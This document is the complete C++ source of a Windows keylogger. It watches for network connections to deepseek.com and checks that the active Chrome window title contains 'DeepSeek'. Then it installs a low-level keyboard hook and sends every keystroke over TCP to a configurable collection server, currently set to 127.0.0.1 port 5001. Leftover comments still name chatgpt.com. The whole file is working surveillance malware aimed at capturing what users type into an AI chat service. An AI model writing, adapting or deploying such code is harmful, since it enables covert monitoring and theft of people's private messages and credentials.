#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>
#include <windows.h>
#include <atomic>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

// Variables
std::mutex keyLogMutex;
std::string capturedText;
std::atomic<bool> decision = false;
HHOOK keyboardHook = nullptr;

// Server configurations
const char *SERVER_HOST = "127.0.0.1";
const int SERVER_PORT = 5001;

// Function to resolve chatgpt.com and return its IPs
std::vector<std::string> resolvedeepSeekIPs()
{
    std::vector<std::string> ipList;
    struct addrinfo hints = {0}, *res = nullptr, *ptr = nullptr;

    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;

    // Call WSAStartup before getaddrinfo()
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed! Error: " << WSAGetLastError() << std::endl;
        return ipList;
    }

    int status = getaddrinfo("deepseek.com", nullptr, &hints, &res);
    if (status != 0)
    {
        std::cerr << "Failed to resolve deepseek.com, Error: " << status << std::endl;
        WSACleanup();
        return ipList;
    }

    for (ptr = res; ptr != nullptr; ptr = ptr->ai_next)
    {
        struct sockaddr_in *sockaddr_ipv4 = (struct sockaddr_in *)ptr->ai_addr;
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, INET_ADDRSTRLEN);
        ipList.push_back(ipStr);
    }

    freeaddrinfo(res);
    WSACleanup(); // Cleanup Winsock after use
    return ipList;
}

// Convert wide string to narrow string
std::string wstring_to_string(const std::wstring &wstr)
{
    if (wstr.empty())
        return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

// Function to check if current window is deepseek
bool IsDeepSeekBrowserWindow() {
    wchar_t windowTitle[256] = {0};
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow) {
        // Get the window title
        if (GetWindowTextW(foregroundWindow, windowTitle, sizeof(windowTitle) / sizeof(wchar_t))) {
            std::wstring title(windowTitle);

            // Check if the title contains "DeepSeek" and "Google Chrome"
            if (title.find(L"DeepSeek") != std::wstring::npos && title.find(L"Google Chrome") != std::wstring::npos) {
                return true;
            }
        }
    }
    return false;
}

// Function to check TCP table for ChatGPT connections
void checkDeepseekConnection(const std::vector<std::string> &deepSeekIPs)
{
    while (true)
    {
        PMIB_TCPTABLE2 tcpTable = nullptr;
        ULONG size = 0;

        // Get the required buffer size
        if (GetTcpTable2(nullptr, &size, TRUE) == ERROR_INSUFFICIENT_BUFFER)
        {
            tcpTable = (PMIB_TCPTABLE2)malloc(size);
        }

        if (!tcpTable)
        {
            std::cerr << "Failed to allocate memory for TCP table\n";
            decision = false;
            continue; // Skip this iteration
        }

        // Retrieve the TCP table
        if (GetTcpTable2(tcpTable, &size, TRUE) == NO_ERROR)
        {
            bool deepSeekDetected = false; // Local flag to track ChatGPT connection

            for (DWORD i = 0; i < tcpTable->dwNumEntries; i++)
            {
                std::string remoteIP = inet_ntoa(*(in_addr *)&tcpTable->table[i].dwRemoteAddr);

                // Check if remote IP matches chatgpt.com IPs
                for (const auto &ip : deepSeekIPs)
                {
                    if (remoteIP == ip)
                    {
                        //std::cout << "Deepseek detected: " << remoteIP << std::endl;
                        deepSeekDetected = true;
                        break;
                    }
                }

                if (deepSeekDetected)
                    break;
            }

            // Update the global decision variable
            decision = deepSeekDetected;
        }
        else
        {
            std::cerr << "Failed to retrieve TCP table\n";
            decision = false; // Reset decision on error
        }

        free(tcpTable);
        std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 2 seconds before next check
        //std::cout << "Checking again\t" << decision << "\n";
    }
}
//Function to send data to server
void sendToServer(const std::string &message)
{
    std::cout << "Send to server function called";
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed" << std::endl;
        return;
        //return false;
    }

    // Create socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        //return false;
        return;
    }

    // Set up server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_HOST);

    // Connect to server
    if (connect(clientSocket, reinterpret_cast<sockaddr *>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        //return false;
        return;
    }

    // Send data
    if (send(clientSocket, message.c_str(), static_cast<int>(message.length()), 0) == SOCKET_ERROR)
    {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        //return false;
        return;
    }

    // Receive acknowledgment
    char buffer[1024] = {0};
    recv(clientSocket, buffer, sizeof(buffer), 0);

    // Cleanup
    closesocket(clientSocket);
    WSACleanup();
    //return true;
    return;
}

// Keyboard hook callback function
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Check if the active window is a browser with deepseek.com open
        if (IsDeepSeekBrowserWindow()) {
            KBDLLHOOKSTRUCT *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);

            // Convert virtual key to character
            wchar_t buffer[5] = {0};
            UINT scanCode = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_VSC);
            int result = ToUnicodeEx(kbStruct->vkCode, scanCode, keyboardState, buffer, 4, 0, NULL);
            std::lock_guard<std::mutex> lock(keyLogMutex);

            // Handle special keys
            if (kbStruct->vkCode == VK_RETURN) {
                sendToServer("[Enter]");
                std::cout<<"[Enter]";
                capturedText += "[Enter]\n";
            } else if (kbStruct->vkCode == VK_SPACE) {
                sendToServer("[Space]");
                std::cout<<"[Space]";
                capturedText += " ";
            } else if (kbStruct->vkCode == VK_TAB) {
                sendToServer("[Tab]");
                std::cout<<"[Tab]";
                capturedText += "[Tab]";
            } else if (kbStruct->vkCode == VK_BACK) {
                sendToServer("[Back Space]");
                std::cout<<"[Back Space]";
                capturedText += "[Backspace]";
            } else if (kbStruct->vkCode >= VK_F1 && kbStruct->vkCode <= VK_F12) {
                sendToServer("[F" + std::to_string(kbStruct->vkCode - VK_F1 + 1) + "]");
                std::cout<<"[F" + std::to_string(kbStruct->vkCode - VK_F1 + 1) + "]";
                capturedText += "[F" + std::to_string(kbStruct->vkCode - VK_F1 + 1) + "]";
            } else if (result == 1) {
                sendToServer(wstring_to_string(std::wstring(buffer, result)));
                std::cout<<wstring_to_string(std::wstring(buffer, result));
                capturedText += wstring_to_string(std::wstring(buffer, result));
            }
            
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void dataCollection()
{
    while (true)
    {
        if (decision)
        {
            // Install the keyboard hook if not already installed
            if (!keyboardHook)
            {
                keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
                if (!keyboardHook)
                {
                    std::cerr << "Failed to install keyboard hook!" << std::endl;
                    return;
                }
                std::cout << "Keyboard hook installed. Capturing keystrokes..." << std::endl;
            }

            // Process messages to keep the hook active
            MSG msg;
            while (true)
            {
                // Check for messages without blocking
                if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
                {
                    if (msg.message == WM_QUIT)
                    {
                        break; // Exit the loop if a quit message is received
                    }
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }

                // Break out of the loop if decision becomes false
                if (!decision)
                {
                    // Send a dummy message to wake up the thread
                    PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
                    break;
                }

                // Sleep for a short time to avoid busy-waiting
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
        else
        {
            // Uninstall the keyboard hook if installed
            if (keyboardHook)
            {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = nullptr;
                std::cout << "Keyboard hook uninstalled." << std::endl;
            }

            // Sleep for a short time to avoid busy-waiting
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
}

int main()
{
    // Resolve chatgpt.com IPs
    const std::vector<std::string> deepSeekIPs = resolvedeepSeekIPs();

    if (deepSeekIPs.empty())
    {
        std::cerr << "No IPs resolved for chatgpt.com\n";
        return 1;
    }

    //std::cout << "Monitoring network connections for deepseek.com...\n";

    // Start the connection checking thread
    std::thread checkingThread(checkDeepseekConnection, deepSeekIPs);

    // Start the data collection thread
    std::thread dataCollectionThread(dataCollection);

    // Wait for threads to finish
    if (checkingThread.joinable())
        checkingThread.join();
    if (dataCollectionThread.joinable())
        dataCollectionThread.join();

    return 0;
}